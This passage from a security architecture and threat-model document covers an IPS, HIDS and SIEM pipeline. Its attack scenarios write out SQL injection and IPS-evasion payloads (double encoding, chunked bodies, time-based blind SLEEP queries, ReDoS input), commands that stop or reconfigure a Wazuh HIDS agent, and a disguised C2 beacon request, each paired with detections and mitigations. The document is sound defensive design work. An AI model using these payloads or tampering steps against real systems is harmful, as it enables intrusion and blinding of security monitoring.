  ├── TLS: ClientHello parsing (SNI, cipher suites, JA3 fingerprint)
  └── Custom parsers for proprietary protocols (Modbus, DNP3, etc.)
  │
  ▼
Detection Engine
  ├── For each rule:
  │   ├── Fast pattern match (Aho-Corasick) in designated buffer
  │   ├── If fast pattern hits: evaluate other options (distance, within, etc.)
  │   └── If all options match: fire PCRE (if present), then trigger action
  │
  ├── Action execution:
  │   ├── alert: write to alert queue (ring buffer)
  │   ├── drop: mark packet for drop (inline only)
  │   ├── reject: send TCP RST (both sides)
  │   └── pass: skip further inspection (whitelist)
  │
  ▼
Output Module
  ├── EVE JSON: structured alert with full metadata
  │   {"timestamp":"2024-01-15T10:23:45.123Z",
  │    "event_type":"alert",
  │    "src_ip":"203.0.113.1","src_port":54321,
  │    "dest_ip":"10.0.0.50","dest_port":80,
  │    "proto":"TCP",
  │    "alert":{"action":"blocked","gid":1,"signature_id":2006445,
  │              "rev":7,"signature":"ET WEB_SERVER SQL Injection",
  │              "category":"Web Application Attack","severity":1},
  │    "http":{"hostname":"shop.example.com",
  │             "url":"/products?id=1' OR '1'='1",
  │             "http_method":"GET","status":null},
  │    "payload_printable":"GET /products?id=1' OR..."}
  │
  └── PCAP: full packet bytes for matched flow (evidence preservation)
  │
  ▼
Log Shipper (Filebeat)
  ├── Tails /var/log/suricata/eve.json
  ├── Parses JSON lines
  ├── Adds: sensor_id, datacenter, environment tags
  ├── Batches: 512 events or 5 seconds (whichever first)
  └── Forwards to Logstash/Elasticsearch over TCP+TLS
  │
  ▼
SIEM Ingestion
  ├── Schema normalization → ECS (Elastic Common Schema) or OCSF
  ├── GeoIP enrichment: src_ip → {country, city, ASN, org}
  ├── Threat intel lookup: src_ip → {reputation score, malware families}
  ├── Asset lookup: dest_ip → {hostname, owner, criticality}
  └── Stored in Elasticsearch index: security-alerts-YYYY.MM.DD
```

---

### 6.2 Serialization Formats

| Format | Used Where | Notes |
|--------|-----------|-------|
| EVE JSON | Suricata output (primary) | Rich structured format; one JSON object per event per line |
| Unified2 | Snort output (legacy) | Binary format; more compact; requires external tool to read |
| CEF (Common Event Format) | Syslog to SIEM | ArcSight's standard; key-value pairs after a header |
| LEEF | IBM QRadar native | Similar to CEF; IBM-specific |
| OCSF | Modern standard (AWS, Splunk) | Open Cybersecurity Schema Framework; JSON-based |
| STIX/TAXII | Threat intel sharing | JSON-based; complex; used for IOC sharing between orgs |
| PCAP | Full packet capture | libpcap binary format; gold standard for forensics |
| NetFlow/IPFIX | Flow metadata (not payload) | Aggregated stats: src/dst, bytes, packets, duration |

---

## 7. Security Controls

### 7.1 Encryption in Transit

- **Sensor to SIEM:** All log forwarding over TLS (mutual TLS recommended). Sensor presents a client certificate to authenticate to SIEM. Prevents a compromised network device from injecting false alerts into the SIEM.
- **Management traffic:** HTTPS (TLS 1.3) for web UI. SSH for CLI. Both over a dedicated management VLAN, not the inspection interface.
- **PCAP storage:** Captured packets may contain sensitive data (credentials, PII in cleartext protocols). Store on encrypted volumes (LUKS, BitLocker). Restrict access to senior analysts.
- **Threat intel feeds:** Download over HTTPS. Verify feed signatures before import.

### 7.2 Encryption at Rest

- **Alert database (SIEM):** Elasticsearch/Splunk indices on encrypted volumes.
- **PCAP archives:** Full disk encryption + application-level access controls.
- **Rule database:** Rules are not secret (most are open source) but rule customizations (which CVEs are NOT covered) should be protected from adversaries.
- **Credentials/API keys:** Stored in HashiCorp Vault or AWS Secrets Manager. Not in config files on disk.

### 7.3 IPS Bypass Prevention

The IPS itself must be hardened against bypass:

**Network-level hardening:**
- Management interface on a separate physical NIC and dedicated VLAN.
- No routing between inspection interface and management interface.
- Management interface only accessible from a jump host.
- Firewall rules: management interface only accepts SSH from jump host IP, HTTPS from SOC workstations.

**OS hardening (sensor node):**
- Minimal OS (stripped Ubuntu/RHEL, only required packages).
- No X11, no unnecessary services.
- AppArmor/SELinux profile for the IPS process.
- Read-only filesystem for OS; write-only directory for logs.
- Auditd monitoring of the IPS process itself.

**Integrity monitoring:**
- The HIDS monitors the IPS binary, configuration files, and rule files for unexpected changes.
- Alert: "IPS rule file modified outside of change window."

### 7.4 False Positive Management

False positives are a security control problem: excessive false positives cause analysts to ignore alerts, creating a "cry wolf" effect.

**Tuning mechanisms:**
- **Threshold rules:** Only alert if the same source IP triggers the same signature more than N times in M seconds. Single-occurrence SQL injection may be a false positive from a WAF test; 100 in 60 seconds is a scan.
- **Suppressions:** Suppress rule SID X from source IP Y. Used for known-good security scanners (internal Nessus, Qualys).
- **Whitelisting by flow:** `pass` rules for specific source/destination pairs that are known good (e.g., vulnerability scanner).
- **SIEM enrichment:** Alert suppressed at SIEM level if dest asset is tagged "test environment."

---

## 8. Attack Surface Mapping

### 8.1 Complete Entry Point Map

```
EXTERNAL ATTACK SURFACE (attacker has internet access)
═══════════════════════════════════════════════════════════════

  ┌──────────────────────────────────────────────────────────┐
  │  MONITORED TRAFFIC (the purpose of the IPS)              │
  │  Any network service exposed to the internet:            │
  │  ├── HTTP/HTTPS endpoints (web apps, APIs)               │
  │  ├── Mail servers (SMTP, IMAP)                           │
  │  ├── VPN endpoints (IKE, SSL-VPN)                        │
  │  ├── DNS resolvers (if exposed)                          │
  │  └── Any other internet-facing service                   │
  └──────────────────────────────────────────────────────────┘

  ┌──────────────────────────────────────────────────────────┐
  │  THE IPS MANAGEMENT INTERFACE ITSELF                     │
  │  (if misconfigured and accessible from internet)         │
  │  ├── Web UI (default port 443 or 8443)                   │
  │  │     Attack: default credentials, auth bypass          │
  │  ├── REST API                                            │
  │  │     Attack: API key theft, SSRF via API               │
  │  └── SSH                                                 │
  │        Attack: weak key, known vulnerabilities in SSH    │
  └──────────────────────────────────────────────────────────┘

INTERNAL ATTACK SURFACE (attacker has internal network access)
═══════════════════════════════════════════════════════════════

  ┌──────────────────────────────────────────────────────────┐
  │  IPS SENSOR (OS-level)                                   │
  │  ├── Local process: inject fake traffic to confuse       │
  │  │                  flow table                           │
  │  ├── Rule modification: disable rules for planned attack │
  │  ├── Log tampering: delete evidence of past attack       │
  │  └── Process injection: modify IPS binary in memory      │
  └──────────────────────────────────────────────────────────┘

  ┌──────────────────────────────────────────────────────────┐
  │  LOG PIPELINE                                            │
  │  ├── Log file on sensor (if world-writable)              │
  │  │     Attack: inject false alerts or delete real ones   │
  │  ├── Log shipper (Filebeat) config                       │
  │  │     Attack: redirect logs to attacker-controlled dest │
  │  └── SIEM ingestion API                                  │
  │        Attack: inject false events to create noise       │
  └──────────────────────────────────────────────────────────┘

  ┌──────────────────────────────────────────────────────────┐
  │  SIEM PLATFORM                                           │
  │  ├── Web UI: lateral movement pivot, data exfiltration   │
  │  ├── Elasticsearch API (port 9200): unauthenticated      │
  │  │     access in misconfigured deployments               │
  │  ├── Kibana/Splunk: SSRF, XSS, CVEs in web UI           │
  │  └── Storage backend: access to all captured events      │
  └──────────────────────────────────────────────────────────┘
```

### 8.2 Trust Boundary Diagram

```
═══════════════════════════════════════════════════════════════════════════

  ZONE: INTERNET (Zero Trust)
  ┌──────────────────────────────────────────────┐
  │  Attackers, Legitimate Users, Partners        │
  │  All traffic: UNTRUSTED until inspected       │
  └──────────────────────────┬───────────────────┘
                             │
         TRUST BOUNDARY 1: IPS Inspection
         (Signature matching, protocol validation,
          TLS interception, rate limiting)
                             │
                             ▼
  ZONE: DMZ (Low Trust — inspected but external-facing)
  ┌──────────────────────────────────────────────┐
  │  Web servers, reverse proxies, mail relays    │
  │  Traffic from here to Internal: also inspected│
  └──────────────────────────┬───────────────────┘
                             │
         TRUST BOUNDARY 2: East-West IPS
         (Internal traffic inspection — lateral movement detection)
                             │
                             ▼
  ZONE: INTERNAL (Medium Trust — authenticated users/systems)
  ┌──────────────────────────────────────────────┐
  │  App servers, DB servers, internal tools      │
  │  HIDS on each host for local monitoring       │
  └──────────────────────────┬───────────────────┘
                             │
         TRUST BOUNDARY 3: Management Network Separation
         (IPS management only accessible from management VLAN)
                             │
                             ▼
  ZONE: MANAGEMENT (High Trust — admin access only)
  ┌──────────────────────────────────────────────┐
  │  IPS sensors (management interface)           │
  │  SIEM platform                               │
  │  Jump hosts / bastion                         │
  │  CI/CD pipeline for rule deployment           │
  └──────────────────────────────────────────────┘

═══════════════════════════════════════════════════════════════════════════
  HIDS TRUST MODEL:
  Each host is its own trust boundary.
  HIDS agent runs with root/SYSTEM privileges.
  Alert pipeline: HIDS → SIEM (separate from network IDS alerts).
  A compromised root process can tamper with HIDS (see Attack Scenarios).
═══════════════════════════════════════════════════════════════════════════
```

---

## 9. Attack Scenarios

### Attack 1: IPS Evasion via Protocol Fragmentation + Encoding

**Category:** Signature evasion
**Attacker assumptions:** Target has a network IPS. Attacker knows IPS is running Suricata/Snort. IPS rule catches SQL injection via `OR 1=1` pattern in HTTP URI.

**Step-by-step execution:**

1. Attacker first tests: `GET /products?id=1+OR+1=1` → blocked.
2. Attacker tries URL encoding: `GET /products?id=1%20OR%201%3D1` → blocked. (IPS normalizes URL encoding.)
3. Attacker tries double URL encoding: `GET /products?id=1%2520OR%25201%253D1` → the outer `%25` decodes to `%`, leaving `%20OR%201%3D1`. If the IPS decodes only once, it sees `%20OR%201%3D1` which doesn't match `OR` literally. The backend web server decodes twice (common in Java frameworks with URL rewriting), seeing `1 OR 1=1`.

4. Alternatively, attacker fragments the TCP stream:
   - Packet 1 (seq 1–3): `GET`
   - Packet 2 (seq 4–20): ` /products?id=1`
   - Packet 3 (seq 21–22): `' `
   - Packet 4 (seq 23–30): `OR '1'`
   - Packet 5 (seq 31–38): `='1`

   If the IPS's reassembly buffer has a size or time limit, it may inspect each fragment independently. `' ` alone doesn't match; `OR '1'` alone doesn't match. The reassembled string `1' OR '1'='1` does match, but only if the IPS correctly reassembles all 5 packets.

5. Attacker tries HTTP chunked encoding:
   ```
   GET /products HTTP/1.1
   Transfer-Encoding: chunked

   5\r\n
   ?id=1\r\n
   6\r\n
   ' OR '\r\n
   3\r\n
   1'=\r\n
   2\r\n
   '1\r\n
   0\r\n
   ```
   If the IPS doesn't reassemble chunked bodies before inspection, each chunk is inspected in isolation.

**Why this works:** IPS inspection is only as good as its normalization. Normalization that doesn't match the behavior of the target application leaves a gap.

**Where detection could happen:**
- Anomaly detection: unusual encoding patterns in URLs (% in parameter values).
- Rate limiting: attacker must send many probes to find the evasion. Volume of 403s / blocked requests from one IP.
- WAF (web application firewall) at the application layer: WAF parses the application context more accurately than a network IPS.

**Mitigation:** Layer defense — IPS + WAF. The WAF understands the application's specific URL decoding behavior and matches the backend's interpretation exactly.

---

### Attack 2: IPS Rule Poisoning via Management Interface Compromise

**Category:** Insider threat / targeted attack against security infrastructure
**Attacker assumptions:** Has credentials for a junior security analyst account with "Rule Author" RBAC role. Plans to exploit a specific CVE in the web application next week.

**Step-by-step execution:**

1. Attacker (or compromised account) logs into IPS management UI.
2. Navigates to Rule Management → finds the signature covering CVE-2024-XXXX (the vulnerability they plan to exploit).
3. Modifies the rule: changes `alert` to `pass` (or adds a `pass` rule with higher priority for the specific destination IP they'll target).
   Or: modifies the PCRE to exclude the specific payload variant they plan to use.
4. Saves the rule change (may or may not go through approval depending on change management controls).
5. Waits 24 hours to ensure no rollback.
6. Executes the exploit — it is not detected or blocked by the IPS.

**Why this works:** Rule management access is often over-provisioned. Change management for security rules is frequently bypassed under "operational necessity." Rule changes don't generate high-visibility alerts.

**Where detection could happen:**
- Rule change audit log: every rule modification logged with user identity and timestamp.
- SIEM alert: "IPS rule modified by non-admin account."
- Four-eyes policy: rule changes require approval from a second analyst.
- Automated rule integrity check: compare deployed rules to a known-good signed baseline every 15 minutes.

---

### Attack 3: Log Flooding / Alert Fatigue Attack

**Category:** Defensive evasion
**Attacker assumptions:** Has the ability to generate network traffic from many sources (botnet). Goal: hide a real attack in noise.

**Step-by-step execution:**

1. **Phase 1 (Preparation — days before the real attack):** Attacker studies the organization's IPS alert categories. Knows that the SOC is already overwhelmed with `Scanner Detected` and `Port Scan` alerts (from legitimate pen testing and internet scanners).

2. **Phase 2 (Alert flood):** Attacker commands botnet to generate massive volumes of known-detectable attack traffic (SQL injection attempts, XSS, LFI) from hundreds of IPs. Each generates IPS alerts.
   - SIEM receives 50,000 alerts/minute instead of normal 500/minute.
   - SOC analysts are overwhelmed. Alert queue grows.
   - Analysts begin triaging at a higher threshold to keep up.
   - Low-severity alerts are auto-acknowledged without review.

3. **Phase 3 (Real attack):** During the flood, attacker executes the real exploit from a single IP that has NOT triggered alerts during the flood (clean IP). The real exploit alert is generated at medium severity.
   - It appears in the queue among thousands of other alerts.
   - SOC analysts, overwhelmed, may auto-acknowledge it or not see it for hours.

4. The real attack succeeds while the SOC is occupied.

**Why this works:** Human attention is finite. Alert queues in overwhelmed SOCs lead to alert fatigue — analysts skip alerts to keep up, or set thresholds so high that real attacks are missed.

**Where detection could happen:**
- Automated SOAR (Security Orchestration, Automation, and Response): ML models detect the flood as anomalous. Auto-escalate: "Alert volume 100× normal — possible cover operation."
- Behavioral analysis: correlate alert volume increase with source IP diversity — coordinated flooding from many IPs at the same time is itself a signature.
- Tiered alert handling: critical assets (database servers, authentication servers) always get priority review regardless of alert volume.

---

### Attack 4: HIDS Tamper — Disabling the Watcher

**Category:** Defense evasion / privilege escalation
**Attacker assumptions:** Has achieved code execution on a web server with a web shell. Has escalated to root via local privilege escalation (e.g., dirty pipe, sudo misconfiguration).

**Step-by-step execution:**

1. Attacker has root shell on `web-server-1`.
2. Checks running processes: `ps aux | grep wazuh` → finds `wazuh-agentd` (HIDS agent).
3. Attempts to stop: `systemctl stop wazuh-agent` → HIDS agent goes down.
4. **What HIDS detects:** The SIEM should receive a "HIDS agent heartbeat lost for web-server-1" alert within the heartbeat interval (typically 60 seconds).
5. If the SOC doesn't respond to the heartbeat alert immediately, attacker has a window to:
   - Modify log files to remove evidence of intrusion.
   - Install a rootkit.
   - Move laterally to other systems.

6. **More sophisticated:** Attacker doesn't stop the agent. Instead, they find the HIDS configuration file (`/var/ossec/etc/ossec.conf`), modify it to exclude the directories they're working in, then signal the agent to reload config.
   - If the HIDS doesn't monitor its own config file, this change is silent.
   - If it does monitor (good practice), an alert is generated: "HIDS configuration file modified."

7. **Most sophisticated:** Attacker uses a kernel rootkit (eBPF or kernel module) to intercept and modify the `inotify` events before they reach the HIDS agent, filtering out events for their files/processes.

**Why this works:** HIDS agents run in userspace (mostly). A root-level attacker has more privileges than the HIDS agent. The attacker can modify the environment the HIDS relies on.

**Where detection could happen:**
- SIEM: "HIDS agent heartbeat lost" within 60 seconds of agent stoppage.
- SIEM: "HIDS configuration file modified."
- SIEM: `systemctl stop wazuh-agent` command logged via auditd (before the agent was stopped).
- Network IDS: lateral movement from web-server-1 to other hosts (attacker pivoting).

---

### Attack 5: Encrypted C2 over Allowed Protocol (HTTPS Beacon)

**Category:** Command and control (C2) evasion
**Attacker assumptions:** Has already compromised an internal host. IPS blocks all non-HTTP/HTTPS outbound traffic. TLS inspection is not deployed.

**Step-by-step execution:**

1. Malware on compromised host beacons to a C2 server hosted on a legitimate-looking domain: `api.analytics-service-cdn.com`.
2. The domain has a valid TLS certificate (Let's Encrypt or purchased). The C2 traffic looks like legitimate HTTPS to an analytics service.
3. Every 60 seconds (to avoid rate-based detection), the malware sends a small HTTPS POST:
   ```
   POST /v1/telemetry HTTP/2
   Host: api.analytics-service-cdn.com
   Content-Type: application/json

   {"session_id":"a3f2b","metrics":{"page_views":5,"time":1234}}
   ```
   The JSON values contain encoded commands. Responses contain encoded C2 instructions.

4. IPS inspection:
   - No TLS inspection deployed → payload is opaque.
   - Source: internal host (no external IP in the IPS rule scope for this traffic).
   - Destination port: 443 (allowed).
   - No signature matches (traffic looks like analytics API calls).
   - No alert.

5. Attacker exfiltrates data by encoding it in the POST body JSON values (base64, then disguised as metric values).

**Why this works:** HTTPS to allowed domains is the hardest C2 channel to detect via signature-based IDS. Without TLS inspection, the IPS is blind. Even with TLS inspection, if the C2 domain has a legitimate certificate and is not in the threat intel feed yet (new domain, fast-flux), signatures don't match.

**Where detection could happen:**
- **DNS analysis:** The domain `api.analytics-service-cdn.com` was registered 2 days ago. Domain age < 30 days → suspicious. SIEM alert.
- **JA3 fingerprinting:** The TLS ClientHello from the malware has a characteristic JA3 hash (fingerprint of cipher suites, extensions, elliptic curves). If the JA3 hash is known to belong to a malware family, alert.
- **Behavioral:** Internal host initiates outbound connection to the same IP every 60 seconds, exactly. Beacon detection: statistical regularity in connection timing → IDS behavioral alert.
- **Proxy logs:** If outbound traffic routes through an HTTP proxy, the proxy sees the `CONNECT` method and the hostname. Domain reputation check fires on the new/uncategorized domain.
- **Network Flow analysis:** Same src → same dst, same payload size, same interval = beacon pattern. NetFlow analytics tools (Zeek, Darktrace) detect this.

---

### Attack 6: SQL Injection That Bypasses IPS via Time-Based Blind Injection (Low and Slow)

**Category:** IPS evasion + data exfiltration
**Attacker assumptions:** Target has IPS blocking classic SQLi patterns. Target is vulnerable to time-based blind SQLi. Attacker has identified the vulnerability but cannot extract data via direct UNION-based injection.

**Step-by-step execution:**

1. Classic `OR 1=1` is blocked by IPS. Attacker knows the target is vulnerable via error-based SQLi.

2. Instead, attacker uses time-based blind injection — extracts one bit of information per HTTP request by measuring response time:
   ```
   GET /products?id=1;IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)-- HTTP/1.1
   ```
   - If the first character of the admin password is 'a', response takes 5+ seconds.
   - If not, response is immediate.

3. Attacker sends 1 request per 30 seconds (to avoid rate-based detection). Cycles through all 95 printable ASCII characters for each of the 20 characters of the password.
   - Total requests: 95 × 20 = 1,900 requests.
   - At 1 request per 30 seconds: 57,000 seconds = ~15 hours.

4. **IPS view:**
   - Each request appears as a legitimate GET request with a slightly unusual query parameter.
   - The SLEEP() function call may not match the IPS's SQL injection signatures if the signatures focus on `OR`, `UNION SELECT`, etc.
   - At 2 requests per minute, no rate-based alerts fire.
   - Each request comes from a clean IP.

5. After 15 hours, attacker has the admin password hash.

**Why this works:** IPS signatures cover known, common patterns. Time-based blind injection using database-specific functions (SLEEP, WAITFOR DELAY, pg_sleep) may not be covered. Low-and-slow avoids rate thresholds. No error messages or unusual HTTP responses visible to the IPS (the vulnerable server returns 200 OK in both cases).

**Where detection could happen:**
- **Application-layer WAF:** Can detect SLEEP() and WAITFOR in query parameters, even if the network IPS misses it.
- **Database monitoring:** DB query log shows `SLEEP()` calls. DB-level IDS (Imperva DAM) fires.
- **Response time anomaly:** Some requests to `/products?id=...` take 5 seconds; most take 50ms. Application performance monitoring detects the anomaly.
- **HTTP access log analysis:** 15 hours of slow, regular requests to the same endpoint from the same IP. Log analysis/SIEM correlation detects the pattern retroactively.

---

## 10. Failure Points

### 10.1 Failures Under Load

| Component | Failure Mode | Threshold | Symptom |
|-----------|-------------|-----------|---------|
| IPS packet capture | Packet drops | > NIC line rate or CPU saturation | Alerts missed; silently drops packets without inspection |
| Flow table | Memory exhaustion | Millions of concurrent flows | Flow table eviction; new flows untracked; state lost |
| TCP reassembly buffer | Memory exhaustion | Many partial flows (half-open) | Incomplete streams skipped; content-based rules bypassed |
| PCRE engine | CPU saturation | Complex regex on large payloads | Catastrophic backtracking; CPU 100%; packet drops |
| Alert queue | Queue overflow | Alert rate > shipper throughput | Recent alerts lost; attackers' final actions unlogged |
| SIEM ingestion | Write bottleneck | > ingestion throughput | Alert delivery lag; SOC working on stale data |
| Elasticsearch | Heap exhaustion | Too many hot shards; large mapping | Search timeouts; alert queries fail; SOC blind |

**Catastrophic backtracking in PCRE — Critical:**
```
Vulnerable regex: (a+)+b
Input: aaaaaaaaaaaaaaaaaaaaaaaaaac (many 'a's followed by non-matching char)

The regex engine tries every possible combination of how to group the 'a's.
For N 'a's: 2^N possible groupings evaluated.
For 30 'a's: over 1 billion combinations → CPU-bound for seconds.

An attacker who knows the IPS's rule set can craft inputs that trigger
backtracking, causing the inspection engine to stall → packets not inspected
→ other attacks pass through uninspected.

Mitigation: 
- Use linear-time regex engines (RE2, Hyperscan)
- Audit all PCRE rules for backtracking potential
- Set PCRE execution time limit (pcre-match-limit in Suricata config)
```

### 10.2 Failures Under Attack

| Attack | Failure Mode | How It Bypasses IPS |
|--------|-------------|---------------------|
| SYN flood | Flow table exhaustion | New flows can't be tracked; connections pass uninspected |
| Alert flood | SOC paralysis | Real alerts buried in noise |
| Large packet bombardment | IPS CPU saturation | Packets dropped before inspection |
| PCRE ReDoS | CPU exhaustion | IPS inspection stalls; all packets pass uninspected |
| Rule set poisoning | Detection gap | Specific attack not covered |
| TLS without inspection | Blind inspection | Payload opaque; signatures can't match |
| Evading reassembly | Fragment splitting | Signatures only match complete payload |
| DoH (DNS over HTTPS) | DNS inspection bypass | DNS queries encrypted; DNS-based C2 undetected |

### 10.3 Common Misconfigurations

1. **IPS in IDS mode (passive) when inline is required.** The IPS can see attacks but cannot block them. Often the result of fear of false positive blocking. Net result: detection without protection.

2. **Default rule set enabled without tuning.** Out-of-box Emerging Threats/Snort rules generate 5,000+ alerts/day on most networks. SOC is immediately overwhelmed. Analysts start ignoring alerts. Security theater ensues.

3. **No TLS inspection deployed.** 90%+ of internet traffic is HTTPS. An IPS without TLS inspection only sees metadata. Provides almost no layer-7 protection for HTTPS services.

4. **Management interface accessible from the internet.** IPS web UI on public IP with default credentials (admin/admin). Attacker logs in, disables all rules, installs a backdoor.

5. **Alert log written to world-writable location.** Attacker with local access deletes the log covering their intrusion. No forensic evidence.

6. **IPS sensor clock not synchronized.** Alerts have incorrect timestamps. Correlation with other systems (firewall logs, application logs) fails. Timeline reconstruction during incident response is unreliable. Always run NTP on sensors.

7. **No high-availability for inline IPS.** Single inline IPS = single point of failure. If the IPS crashes, does it fail-open (all traffic passes, no inspection) or fail-closed (all traffic blocked, network outage)? Most orgs prefer fail-open (availability over security). This means a crashing IPS = zero protection.

8. **PCAP storage not rate-limited.** IPS configured to capture full packets for every alert. During a scan, 10,000 alerts trigger 10,000 PCAP files. Disk fills up. PCAP capture stops. The most important packets (during the real attack 3 hours later) are not captured.

9. **Not monitoring the monitoring system.** The IPS itself is not monitored for health. Packet drops, queue overflows, and CPU saturation occur silently. SOC doesn't know the IPS is failing. Assumption: "No alerts = no attacks."

10. **Rule updates without testing.** New rule set version deployed directly to production. A rule has a false-positive pattern matching the organization's own applications. Business disruption until the rule is disabled.

---

## 11. Mitigations

### 11.1 Deployment Architecture Mitigations

| Problem | Mitigation | Tradeoff |
|---------|-----------|----------|
| Single point of failure | Active-active HA pair with bypass NIC (fail-open) | Cost 2×; fail-open means zero protection during failover |
| Performance at line rate | Dedicated hardware with DPDK + Hyperscan; offload to ASIC | Expensive; less flexible than software |
| TLS blind spot | Deploy TLS inspection proxy | Privacy concerns; certificate management complexity; breaks mTLS/pinning |
| Alert fatigue | Reduce rule set to high-fidelity rules; implement alert tiers | May miss novel attacks; tuning requires skilled analyst time |
| Fragmentation evasion | Strict reassembly before inspection; normalize overlapping segments | Higher memory usage; increased latency for fragmented flows |
| DoH bypass | Block DoH providers (8.8.8.8:443 with dns.google SNI); force all DNS through internal resolver | Breaks privacy for users; may not be feasible in all environments |

### 11.2 Defense-in-Depth Architecture

```
LAYER 1: Perimeter Firewall (L3/L4)
  Purpose: Block obviously unwanted traffic BEFORE it reaches IPS
  Controls: Port allowlists, geo-blocking, source IP reputation
  Reduces IPS load by 60-80%
  ↓
LAYER 2: Network IPS (L3–L7)
  Purpose: Deep packet inspection, signature matching, anomaly detection
  Controls: SQLi, XSS, exploit detection, protocol anomaly
  ↓
LAYER 3: Web Application Firewall (L7, application-context-aware)
  Purpose: Application-specific inspection (knows URL routing, parameter names)
  Controls: OWASP Top 10, positive security model, session tracking
  ↓
LAYER 4: API Gateway
  Purpose: Schema validation, rate limiting, authentication enforcement
  Controls: JSON/XML schema validation, JWT verification, throttling
  ↓
LAYER 5: Application Code (input validation)
  Purpose: Last line of defense; knows exact expected input
  Controls: Parameterized queries, output encoding, type checking
  ↓
LAYER 6: Host IDS (HIDS)
  Purpose: Detect post-exploitation activity on the host itself
  Controls: FIM, process monitoring, log analysis, rootkit detection
  ↓
LAYER 7: SIEM + EDR + Threat Hunting
  Purpose: Detect what all layers miss; correlate across sources
  Controls: Behavioral analytics, ML anomaly detection, IOC matching

Key principle: No single layer is sufficient.
Each layer catches what the previous one misses.
```

### 11.3 Rule Tuning Strategy

```
Step 1: Start with all rules DISABLED.
  → Enable one category at a time.
  → Run in alert-only mode (IDS) for 2 weeks.
  → Analyze alerts. Identify false positives.

Step 2: For each rule category:
  → Identify false-positive sources.
  → Add suppressions for known-good sources.
  → Adjust thresholds (alert after N occurrences, not 1).
  → Disable rules that can't be tuned to <5% false positive rate.

Step 3: Enable blocking (IPS mode) ONLY for high-confidence rules.
  → These are rules where ANY match is malicious (shellcode patterns,
     specific CVE payloads with no legitimate use case).
  → Keep anomaly/heuristic rules in IDS-only mode.

Step 4: Continuous tuning feedback loop.
  → Weekly review of top alert generators.
  → Post-incident review: did the IPS detect it? If not, write a rule.
  → Monthly false positive review.
```

---

## 12. Observability

### 12.1 IPS Sensor Health Metrics

These metrics are about the IPS itself — not the attacks it detects. If these are unhealthy, the IPS is not actually protecting you.

| Metric | Healthy Range | Alert On |
|--------|--------------|----------|
| `capture.kernel_packets` | Growing steadily | N/A |
| `capture.kernel_drops` | 0 | > 0 (any packet drop = missed inspection) |
| `flow.tcp.reuse` | Low | High sustained rate (connection exhaustion) |
| `detect.engines.*.rules` | Count matches deployed ruleset | Any decrease (rule deletion) |
| `detect.alert` | Baseline-dependent | Spike > 10× baseline |
| `decoder.invalid` | Low | High rate (malformed packet flood) |
| `stream.reassembly_memcap_drop` | 0 | > 0 (reassembly buffer exhausted) |
| CPU utilization | < 70% | > 85% sustained (PCRE DoS, packet flood) |
| Memory utilization | < 80% | > 90% (flow table or reassembly exhaustion) |

### 12.2 Alert Log Structure (EVE JSON — Full Example)

```json
{
  "timestamp": "2024-01-15T10:23:45.123456+0000",
  "flow_id": 1234567890123456,
  "event_type": "alert",
  "src_ip": "203.0.113.1",
  "src_port": 54321,
  "dest_ip": "10.0.0.50",
  "dest_port": 443,
  "proto": "TCP",
  "tx_id": 0,
  "alert": {
    "action": "blocked",
    "gid": 1,
    "signature_id": 2006445,
    "rev": 7,
    "signature": "ET WEB_SERVER SQL Injection Attempt",
    "category": "Web Application Attack",
    "severity": 1,
    "metadata": {
      "affected_product": ["Web_Browsers"],
      "attack_target": ["Server"],
      "confidence": ["High"]
    }
  },
  "http": {
    "hostname": "shop.example.com",
    "url": "/products?id=1%27%20OR%20%271%27%3D%271",
    "http_decoded_hostname": "shop.example.com",
    "http_decoded_url": "/products?id=1' OR '1'='1",
    "http_user_agent": "Mozilla/5.0 (compatible; sqlmap/1.7)",
    "http_method": "GET",
    "protocol": "HTTP/1.1",
    "http_refer": null,
    "http_content_type": null,
    "length": 0
  },
  "app_proto": "http",
  "flow": {
    "pkts_toserver": 4,
    "pkts_toclient": 2,
    "bytes_toserver": 512,
    "bytes_toclient": 256,
    "start": "2024-01-15T10:23:45.100000+0000",
    "end": "2024-01-15T10:23:45.123456+0000",
    "age": 0,
    "state": "closed",
    "reason": "tcp_rst"
  },
  "payload": "R0VUIC9wcm9kdWN0cz9pZD0xJyBPUiAnMSc9JzE=",
  "payload_printable": "GET /products?id=1' OR '1'='1",
  "stream": 0,
  "packet": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
  "sensor": {
    "id": "sensor-perimeter-01",
    "datacenter": "us-east-dc1",
    "interface": "eth1"
  }
}
```

### 12.3 SIEM Correlation Rules — Concrete Examples

**Rule: Coordinated SQL Injection Scan**
```
Trigger: More than 5 distinct SQLi alerts (different SIDs) 
         from the same source IP within 10 minutes.
Severity: HIGH
Action: Auto-block source IP at perimeter firewall for 1 hour.
        Create incident ticket. Page on-call analyst.
```

**Rule: IPS Sensor Heartbeat Lost**
```
Trigger: No events received from sensor-id X for > 90 seconds.
         (Normal: events every 1-30 seconds from any active sensor)
Severity: CRITICAL
Action: Page on-call immediately.
Rationale: A lost sensor = blind spot. Could be attack, could be hardware.
```

**Rule: IPS Rule Modification**
```
Trigger: API call to IPS management: rule_action = "modify" OR "delete"
         and modifier_role != "admin"
Severity: HIGH
Action: Notify security manager. Require review before change takes effect.
```

**Rule: Beacon Detection**
```
Trigger: Single source IP connects to same destination IP
         more than 20 times in 30 minutes,
         with inter-connection interval variance < 5 seconds
         (too regular to be human behavior).
Severity: MEDIUM
Action: Create investigation ticket. Analyst reviews.
```

**Rule: Potential DNS Tunneling**
```
Trigger: Single internal host generates DNS queries where:
         - Unique subdomain count > 100 in 5 minutes
         - Average subdomain length > 40 characters
         - All queries to same apex domain
Severity: HIGH
Action: Block DNS from that host at resolver. Page analyst.
```

### 12.4 Distributed Tracing for Security Events

Modern SIEM platforms support end-to-end tracing of an attacker's path:

```
Trace: Attack-Campaign-20240115-SQLi

├── [T+0s] IPS: SQLi detected, blocked — src:203.0.113.1
├── [T+30s] IPS: Port scan from 203.0.113.1 (50 ports in 30s)
├── [T+2min] IPS: Directory traversal attempt from 203.0.113.1
├── [T+5min] DNS: Lookup for "shop.example.com" from 203.0.113.1 
│                 via external resolver
├── [T+7min] IPS: Same payload, now from 203.0.113.99 (proxy pivot?)
└── Correlation: Both IPs in same /24 subnet, same ASN
                 Enrichment: ASN belongs to known VPN exit provider
                 Assessment: Single attacker using VPN, changing exit IPs

SIEM automated action: Block entire /24 at perimeter for 24h.
                       High-confidence based on pattern.
```

### 12.5 Alert vs. No-Alert Reference

**Alert (page immediately):**
- Any IPS sensor heartbeat loss.
- IPS rule modification outside change window.
- Critical asset (database, auth server) targeted with any HIGH/CRITICAL severity signature.
- HIDS: webshell created on web server.
